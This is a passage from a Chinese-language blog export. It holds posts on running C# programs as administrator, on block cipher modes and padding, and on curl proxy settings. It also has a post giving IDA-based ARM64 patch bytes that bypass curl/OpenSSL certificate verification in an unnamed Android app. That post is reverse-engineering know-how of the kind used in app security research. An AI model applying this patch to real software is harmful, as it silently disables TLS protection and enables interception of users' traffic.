<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] Args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当前用户是管理员的时候，直接启动应用程序</span></span><br><span class="line"><span class="comment">     * 如果不是管理员，则使用启动对象启动程序，以确保使用管理员身份运行</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//获得当前登录的Windows用户标示</span></span><br><span class="line">    System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();</span><br><span class="line">    <span class="comment">//创建Windows用户主题</span></span><br><span class="line">    Application.EnableVisualStyles();</span><br><span class="line"></span><br><span class="line">    System.Security.Principal.WindowsPrincipal principal = <span class="keyword">new</span> System.Security.Principal.WindowsPrincipal(identity);</span><br><span class="line">    <span class="comment">//判断当前登录用户是否为管理员</span></span><br><span class="line">    <span class="keyword">if</span> (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果是管理员，则直接运行</span></span><br><span class="line"></span><br><span class="line">        Application.EnableVisualStyles();</span><br><span class="line">        Application.Run(<span class="keyword">new</span> Form1());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//创建启动对象</span></span><br><span class="line">        System.Diagnostics.ProcessStartInfo startInfo = <span class="keyword">new</span> System.Diagnostics.ProcessStartInfo();</span><br><span class="line">        <span class="comment">//设置运行文件</span></span><br><span class="line">        startInfo.FileName = System.Windows.Forms.Application.ExecutablePath;</span><br><span class="line">        <span class="comment">//设置启动参数</span></span><br><span class="line">        startInfo.Arguments = String.Join(<span class="string">&quot; &quot;</span>, Args);</span><br><span class="line">        <span class="comment">//设置启动动作,确保以管理员身份运行</span></span><br><span class="line">        startInfo.Verb = <span class="string">&quot;runas&quot;</span>;</span><br><span class="line">        <span class="comment">//如果不是管理员，则启动UAC</span></span><br><span class="line">        System.Diagnostics.Process.Start(startInfo);</span><br><span class="line">        <span class="comment">//退出</span></span><br><span class="line">        System.Windows.Forms.Application.Exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/testcs_dn/article/details/9903727">C#默认以管理员身份运行程序</a></p>
]]></content>
      <tags>
        <tag>CSharp</tag>
      </tags>
  </entry>
  <entry>
    <title>对称加密 工作模式 填充方式</title>
    <url>/2021/11/21/cryptography-mode-and-padding/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>通过维基百科和博客，学习了对称加密的工作模式和填充方式，记录一下。</p>
<p>图源：<a href="https://blog.csdn.net/gozhuyinglong/article/details/121200733">一文搞懂对称加密：加密算法、工作模式、填充方式、代码实现</a></p>
<h2 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><p>最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p>
<span id="more"></span>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crypto-mode-ecb.png"><br>本方法的缺点在于同样的明文块会被加密成相同的密文块；因此，它不能很好的隐藏数据模式。</p>
<h3 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h3><p>1976年，IBM发明了密码分组链接（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crypto-mode-cbc.png"><br>CBC是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p>
<p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p>
<h2 id="PCBC"><a href="#PCBC" class="headerlink" title="PCBC"></a>PCBC</h2><p>填充密码块链接（PCBC，Propagating cipher-block chaining）或称为明文密码块链接（Plaintext cipher-block chaining，是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p>
<p>PCBC主要用于Kerberos v4和WASTE中，而在其它场合的应用较少。对于使用PCBC加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5没有使用PCBC。</p>
<h2 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h2><p>密文反馈（CFB，Cipher feedback）模式类似于CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似。该模式首先将前一个密文分组进行加密，再与当前明文分组进行XOR运算，来生成密文分组。同样CFB模式也需要一个IV。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crypto-mode-cfb.png"></p>
<h2 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h2><p>输出反馈模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crypto-mode-ofb.png"></p>
<h2 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h2><p>注意：CTR模式（Counter mode，CM）也被称为ICM模式（Integer Counter Mode，整数计数模式）和SIC模式（Segmented Integer Counter）。<br>与OFB相似，CTR将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/crypto-mode-ctr.png"></p>
<p>使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非CTR模式本身的弱点。</p>
<h2 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h2><h2 id="为什么需要填充"><a href="#为什么需要填充" class="headerlink" title="为什么需要填充"></a>为什么需要填充</h2><p>块密码只能对确定长度的数据块进行处理，而消息的长度通常是可变的。因此部分模式（即ECB和CBC）需要最后一块在加密前进行填充。</p>
<p>CFB，OFB和CTR模式不需要对长度不为密码块大小整数倍的消息进行特别的处理。因为这些模式是通过对块密码的输出与明文进行异或工作的。最后一个明文块（可能是不完整的）与密钥流块的前几个字节异或后，产生了与该明文块大小相同的密文块。流密码的这个特性使得它们可以应用在需要密文和明文数据长度严格相等的场合，也可以应用在以流形式传输数据而不便于进行填充的场合。</p>
<h3 id="位填充（Bit-padding）"><a href="#位填充（Bit-padding）" class="headerlink" title="位填充（Bit padding）"></a>位填充（Bit padding）</h3><p>第一位为<code>1</code>，补<code>0</code>至块大小。</p>
<h3 id="字节填充（Byte-padding）"><a href="#字节填充（Byte-padding）" class="headerlink" title="字节填充（Byte padding）"></a>字节填充（Byte padding）</h3><h4 id="ANSI-X9-23"><a href="#ANSI-X9-23" class="headerlink" title="ANSI X9.23"></a>ANSI X9.23</h4><p>最后一个字节为<code>需要填充的字节长度值</code>，其余位填充随机数（通常填充<code>00</code>）</p>
<p>例：下例中，块大小为 8 字节，需要填充 4 字节（以十六进制表示）。</p>
<blockquote>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 00 00 00 04 |</p>
</blockquote>
<h4 id="ISO-10126"><a href="#ISO-10126" class="headerlink" title="ISO 10126"></a>ISO 10126</h4><p>最后一个字节为<code>需要填充的字节长度值</code>，其余位填充随机数：</p>
<blockquote>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 |</p>
</blockquote>
<h4 id="PKCS-5-和-PKCS-7"><a href="#PKCS-5-和-PKCS-7" class="headerlink" title="PKCS#5 和 PKCS#7"></a>PKCS#5 和 PKCS#7</h4><p><code>PKCS#7</code>并未规定块大小。<code>PKCS#5</code>是<code>PKCS#7</code>的子集，其块大小固定为8字节（64位）</p>
<p>所有字节均为<code>需要填充的字节长度值</code>：</p>
<blockquote>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 04 04 04 04 |</p>
</blockquote>
<p>PS：由于AES的块大小是128，所以虽然在Java中是<code>AES/CBC/PKCS5Padding</code>，但用的实际上是<code>PKCS#7</code></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>输入数据本身已对齐时，也需要填充一块长度为块大小的数据。保证解密时能够区分边界（识别出padding并去除）。</p>
<h4 id="ISO-IEC-7816-4"><a href="#ISO-IEC-7816-4" class="headerlink" title="ISO/IEC 7816-4"></a>ISO/IEC 7816-4</h4><p>类似于位填充，第一个字节是<code>80</code>，补<code>00</code>至块大小。</p>
<p>ISO/IEC 7816-4 是包含文件系统的智能卡的通信标准，本身不包含任何密码规范。</p>
<h4 id="Zero-padding"><a href="#Zero-padding" class="headerlink" title="Zero padding"></a>Zero padding</h4><p>未对齐填充<code>00</code>，对齐则不填充</p>
<h4 id="None"><a href="#None" class="headerlink" title="None"></a>None</h4><p>不填充</p>
<p>适合C语言中的字符串（末尾有<code>00</code>），可以区分边界。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zh.wikipedia.org/zh-hans/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">分组密码工作模式</a><br><a href="https://zh.wikipedia.org/zh-hans/%E5%A1%AB%E5%85%85_(%E5%AF%86%E7%A0%81%E5%AD%A6)">填充_(密码学)</a><br><a href="https://en.wikipedia.org/wiki/Padding_(cryptography)">Padding (cryptography)</a></p>
]]></content>
      <tags>
        <tag>Cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux通过环境变量设置curl代理</title>
    <url>/2020/04/16/curl-set-proxy-by-pathvar/</url>
    <content><![CDATA[<h2 id="Docker、Git代理配置"><a href="#Docker、Git代理配置" class="headerlink" title="Docker、Git代理配置"></a>Docker、Git代理配置</h2><p>见<a href="https://blog.xhyeax.com/2021/10/03/set-proxy-of-docker-git-and-others/">在Linux下设置代理</a></p>
<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export http_proxy=http://your-ip-address:port/</span><br><span class="line">export http_proxy=http://user:password@your-proxy-ip-address:port</span><br></pre></td></tr></table></figure>
<p>代理格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[user:password@]proxyhost[:port]/</span><br><span class="line">https://[user:password@]proxyhost[:port]/</span><br><span class="line">socks5://[user:password@]proxyhost[:port]/</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/zafu/p/10000188.html">如何让 curl 命令通过代理访问</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过curl openssl证书校验</title>
    <url>/2022/05/06/curl-openssl-bypass/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>某app使用了<code>curl</code>+<code>openssl</code>进行<code>https</code>通信，并开启了证书校验。<br>通过分析<code>curl</code>源码，定位到证书校验位置，Patch汇编代码，绕过证书校验。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h3><p><code>SSL_CTX_set_verify</code>定义：<a href="https://github.com/openssl/openssl/blob/openssl-3.0.3/ssl/ssl_lib.c#L3551">openssl/ssl/ssl_lib.c#L3551</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SSL_CTX_set_verify</span><span class="params">(SSL_CTX *ctx, <span class="keyword">int</span> mode,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">int</span> (*cb) (<span class="keyword">int</span>, X509_STORE_CTX *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ctx-&gt;verify_mode = mode;</span><br><span class="line">    ctx-&gt;default_verify_callback = cb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用位置<code>ossl_connect_step1</code>：<a href="https://github.com/curl/curl/blob/curl-7_83_0/lib/vtls/openssl.c#L3200">curl/lib/vtls/openssl.c#L3200</a><br>相关变量<code>verifypeer</code>：<a href="https://github.com/curl/curl/blob/curl-7_83_0/lib/vtls/openssl.c#L2676">curl/lib/vtls/openssl.c#L2676</a></p>
<span id="more"></span>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> CURLcode <span class="title">ossl_connect_step1</span><span class="params">(struct Curl_easy *data,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   struct connectdata *conn, <span class="keyword">int</span> sockindex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">bool</span> verifypeer = <span class="built_in">SSL_CONN_CONFIG</span>(verifypeer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">SSL_CTX_set_verify</span>(backend-&gt;ctx,</span><br><span class="line">                     verifypeer ? SSL_VERIFY_PEER : SSL_VERIFY_NONE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p><code>SSL_CONN_CONFIG</code>、<code>SSL_VERIFY_NONE</code>、<code>SSL_VERIFY_PEER</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SSL_CONN_CONFIG(var) conn-&gt;ssl_config.var</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> SSL_VERIFY_NONE                 0x00</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> SSL_VERIFY_PEER                 0x01</span></span><br></pre></td></tr></table></figure>

<p>即获取<code>conn-&gt;ssl_config.verifypeer</code>的值，设置给<code>verifypeer</code>变量。</p>
<p><code>ssl_primary_config</code>结构体：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_primary_config</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> version;          <span class="comment">/* what version the client wants to use */</span></span><br><span class="line">  <span class="keyword">long</span> version_max;      <span class="comment">/* max supported version the client wants to use*/</span></span><br><span class="line">  <span class="keyword">char</span> *CApath;          <span class="comment">/* certificate dir (doesn&#x27;t work on windows) */</span></span><br><span class="line">  <span class="keyword">char</span> *CAfile;          <span class="comment">/* certificate to verify peer against */</span></span><br><span class="line">  <span class="keyword">char</span> *issuercert;      <span class="comment">/* optional issuer certificate filename */</span></span><br><span class="line">  <span class="keyword">char</span> *clientcert;</span><br><span class="line">  <span class="keyword">char</span> *random_file;     <span class="comment">/* path to file containing &quot;random&quot; data */</span></span><br><span class="line">  <span class="keyword">char</span> *egdsocket;       <span class="comment">/* path to file containing the EGD daemon socket */</span></span><br><span class="line">  <span class="keyword">char</span> *cipher_list;     <span class="comment">/* list of ciphers to use */</span></span><br><span class="line">  <span class="keyword">char</span> *cipher_list13;   <span class="comment">/* list of TLS 1.3 cipher suites to use */</span></span><br><span class="line">  <span class="keyword">char</span> *pinned_key;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">curl_blob</span> *<span class="title">cert_blob</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">curl_blob</span> *<span class="title">ca_info_blob</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">curl_blob</span> *<span class="title">issuercert_blob</span>;</span></span><br><span class="line">  <span class="keyword">char</span> *curves;          <span class="comment">/* list of curves to use */</span></span><br><span class="line">  <span class="built_in">BIT</span>(verifypeer);       <span class="comment">/* set TRUE if this is desired */</span></span><br><span class="line">  <span class="built_in">BIT</span>(verifyhost);       <span class="comment">/* set TRUE if CN/SAN must match hostname */</span></span><br><span class="line">  <span class="built_in">BIT</span>(verifystatus);     <span class="comment">/* set TRUE if certificate status must be checked */</span></span><br><span class="line">  <span class="built_in">BIT</span>(sessionid);        <span class="comment">/* cache session IDs or not */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Patch思路"><a href="#Patch思路" class="headerlink" title="Patch思路"></a>Patch思路</h3><p>修改<code>conn-&gt;ssl_config.verifypeer</code>的值（只修改最低位），并Patch相关代码。</p>
<h2 id="定位过程"><a href="#定位过程" class="headerlink" title="定位过程"></a>定位过程</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><a href="https://github.com/curl/curl/blob/curl-7_83_0/lib/vtls/openssl.c#L3169">curl/lib/vtls/openssl.c#L3169</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(ssl_crlfile) &#123;</span><br><span class="line">  <span class="comment">/* tell OpenSSL where to find CRL file that is used to check certificate</span></span><br><span class="line"><span class="comment">   * revocation */</span></span><br><span class="line">  lookup = <span class="built_in">X509_STORE_add_lookup</span>(<span class="built_in">SSL_CTX_get_cert_store</span>(backend-&gt;ctx),</span><br><span class="line">                               <span class="built_in">X509_LOOKUP_file</span>());</span><br><span class="line">  <span class="keyword">if</span>(!lookup ||</span><br><span class="line">     (!<span class="built_in">X509_load_crl_file</span>(lookup, ssl_crlfile, X509_FILETYPE_PEM)) ) &#123;</span><br><span class="line">    <span class="built_in">failf</span>(data, <span class="string">&quot;error loading CRL file: %s&quot;</span>, ssl_crlfile);</span><br><span class="line">    <span class="keyword">return</span> CURLE_SSL_CRL_BADFILE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Everything is fine. */</span></span><br><span class="line">  <span class="built_in">infof</span>(data, <span class="string">&quot;successfully loaded CRL file:&quot;</span>);</span><br><span class="line">  <span class="built_in">X509_STORE_set_flags</span>(<span class="built_in">SSL_CTX_get_cert_store</span>(backend-&gt;ctx),</span><br><span class="line">                       X509_V_FLAG_CRL_CHECK|X509_V_FLAG_CRL_CHECK_ALL);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">infof</span>(data, <span class="string">&quot;  CRLfile: %s&quot;</span>, ssl_crlfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(verifypeer)</span><br></pre></td></tr></table></figure>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><code>IDA</code>搜索字符串<code>CRLfile: %s</code>，查看交叉引用，F5反编译，下一个if使用的变量即为<code>verifypeer</code>。<br>反编译结果：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v14 = data;</span><br><span class="line"><span class="built_in">infof</span>(data, <span class="string">&quot;successfully load CRL file:\n&quot;</span>);</span><br><span class="line">v193 = <span class="built_in">SSL_CTX_get_cert_store</span>(*v302);</span><br><span class="line"><span class="built_in">X509_STORE_set_flags</span>(v193, <span class="number">12LL</span>);</span><br><span class="line"><span class="built_in">infof</span>(data, <span class="string">&quot;  CRLfile: %s\n&quot;</span>, v289);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( (verifypeer &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure>
<p>将其重命名后，在<code>IDA View</code>查看变量<code>verifypeer</code>交叉引用位置，Patch即可。</p>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>原始指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">68 43 49 39                   LDRB            W8, [X27,#0x250]</span><br><span class="line">E8 5F 00 B9                   STR             W8, [SP,#0xAD0+verifypeer]</span><br></pre></td></tr></table></figure>
<p>Patch指令：（动态调试可知，原始数据为<code>0xb</code>，最低位替换为0即为<code>0xa</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov w8, #0xa</span><br><span class="line">str w8, [x27, #0x250]</span><br></pre></td></tr></table></figure>
<p><code>48 01 80 52 68 53 02 B9</code></p>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>在字符串<code>Cipher selection: %s</code>引用位置下方，有<code>LDR W9, [SP,#0xAD0+verifypeer]</code>指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000089A00 01 0A 00 B0 21 08 33 91       ADRL            X1, aCipherSelectio     ; &quot;Cipher selection: %s\n&quot;</span><br><span class="line">.text:0000000000089A08 E2 03 15 AA                   MOV             X2, X21</span><br><span class="line">.text:0000000000089A0C 1E 6A FF 97                   BL              infof</span><br><span class="line">.text:0000000000089A0C</span><br><span class="line">.text:0000000000089A10</span><br><span class="line">.text:0000000000089A10                               loc_89A10                               ; CODE XREF: ossl_connect_step1_88194+1854↑j</span><br><span class="line">.text:0000000000089A10 E1 3B 40 F9                   LDR             X1, [SP,#0xAD0+var_A60]</span><br><span class="line">.text:0000000000089A14 E9 5F 40 B9                   LDR             W9, [SP,#0xAD0+verifypeer]</span><br></pre></td></tr></table></figure>
<p>将其Patch为赋值语句即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">49 01 80 52                             MOV             W9, #0xA</span><br></pre></td></tr></table></figure>
<h2 id="源码分析过程"><a href="#源码分析过程" class="headerlink" title="源码分析过程"></a>源码分析过程</h2><p>一开始不知道<code>SSL_CTX_set_verify</code>这一函数，分析了连接的创建过程。在此记录一下。<br>查看<code>docs\examples\https.c</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CURL *curl;</span><br><span class="line">  CURLcode res;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">curl_global_init</span>(CURL_GLOBAL_DEFAULT);</span><br><span class="line"></span><br><span class="line">  curl = <span class="built_in">curl_easy_init</span>();</span><br><span class="line">  <span class="keyword">if</span>(curl) &#123;</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_URL, <span class="string">&quot;https://example.com/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SKIP_PEER_VERIFICATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If you want to connect to a site who is not using a certificate that is</span></span><br><span class="line"><span class="comment">     * signed by one of the certs in the CA bundle you have, you can skip the</span></span><br><span class="line"><span class="comment">     * verification of the server&#x27;s certificate. This makes the connection</span></span><br><span class="line"><span class="comment">     * A LOT LESS SECURE.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If you have a CA cert for the server stored someplace else than in the</span></span><br><span class="line"><span class="comment">     * default bundle, then the CURLOPT_CAPATH option might come handy for</span></span><br><span class="line"><span class="comment">     * you.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSL_VERIFYPEER, <span class="number">0L</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SKIP_HOSTNAME_VERIFICATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If the site you are connecting to uses a different host name that what</span></span><br><span class="line"><span class="comment">     * they have mentioned in their server certificate&#x27;s commonName (or</span></span><br><span class="line"><span class="comment">     * subjectAltName) fields, libcurl will refuse to connect. You can skip</span></span><br><span class="line"><span class="comment">     * this check, but this will make the connection less secure.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSL_VERIFYHOST, <span class="number">0L</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Perform the request, res will get the return code */</span></span><br><span class="line">    res = <span class="built_in">curl_easy_perform</span>(curl);</span><br><span class="line">    <span class="comment">/* Check for errors */</span></span><br><span class="line">    <span class="keyword">if</span>(res != CURLE_OK)</span><br><span class="line">      <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;curl_easy_perform() failed: %s\n&quot;</span>,</span><br><span class="line">              <span class="built_in">curl_easy_strerror</span>(res));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* always cleanup */</span></span><br><span class="line">    <span class="built_in">curl_easy_cleanup</span>(curl);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">curl_global_cleanup</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SKIP-PEER-VERIFICATION"><a href="#SKIP-PEER-VERIFICATION" class="headerlink" title="SKIP_PEER_VERIFICATION"></a>SKIP_PEER_VERIFICATION</h3><p>调用链：<code>curl_easy_setopt</code>-&gt;<code>Curl_vsetopt</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">CURLcode <span class="title">Curl_vsetopt</span><span class="params">(struct Curl_easy *data, CURLoption option, va_list param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">case</span> CURLOPT_SSL_VERIFYPEER:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Enable peer SSL verifying.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  data-&gt;set.ssl.primary.verifypeer = (<span class="number">0</span> != <span class="built_in">va_arg</span>(param, <span class="keyword">long</span>)) ?</span><br><span class="line">    TRUE : FALSE;</span><br></pre></td></tr></table></figure>
<p>实际上也是修改<code>ssl_primary_config</code>结构体。</p>
<h3 id="curl-easy-perform"><a href="#curl-easy-perform" class="headerlink" title="curl_easy_perform"></a>curl_easy_perform</h3><p>调用链：<code>curl_easy_perform</code>-&gt;<code>easy_perform</code>-&gt;<code>easy_transfer</code>-&gt;<code>curl_multi_perform</code>-&gt;<code>multi_runsingle</code>-&gt;<code>Curl_connect</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> CURLMcode <span class="title">multi_runsingle</span><span class="params">(struct Curl_multi *multi,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 struct curltime *nowp,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 struct Curl_easy *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      result = <span class="built_in">Curl_connect</span>(data, &amp;async, &amp;protocol_connected);</span><br><span class="line">      <span class="keyword">if</span>(CURLE_NO_CONNECTION_AVAILABLE == result) &#123;</span><br><span class="line">        <span class="comment">/* There was no connection available. We will go to the pending</span></span><br><span class="line"><span class="comment">           state and wait for an available connection. */</span></span><br><span class="line">        <span class="built_in">multistate</span>(data, MSTATE_PENDING);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* add this handle to the list of connect-pending handles */</span></span><br><span class="line">        <span class="built_in">Curl_llist_insert_next</span>(&amp;multi-&gt;pending, multi-&gt;pending.tail, data,</span><br><span class="line">                               &amp;data-&gt;connect_queue);</span><br><span class="line">        result = CURLE_OK;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(data-&gt;state.previouslypending) &#123;</span><br><span class="line">        <span class="comment">/* this transfer comes from the pending queue so try move another */</span></span><br><span class="line">        <span class="built_in">infof</span>(data, <span class="string">&quot;Transfer was pending, now try another&quot;</span>);</span><br><span class="line">        <span class="built_in">process_pending_handles</span>(data-&gt;multi);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>导出sqlite3数据库为sql</title>
    <url>/2019/10/15/db-sqlite3-to-sql/</url>
